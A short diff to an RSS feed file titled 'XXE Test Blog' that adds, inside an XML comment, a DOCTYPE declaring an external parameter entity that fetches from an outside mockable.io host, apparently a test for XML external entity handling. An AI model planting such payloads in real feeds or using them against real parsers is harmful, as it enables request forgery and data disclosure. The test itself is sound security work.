@@ -1,5 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!-- <!DOCTYPE lolz []> -->
+<!-- 
+<!DOCTYPE svg [
+<!ENTITY % outside SYSTEM "http://demo6986808.mockable.io">
+%outside;
+]>
+-->
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>XXE Test Blog</title>
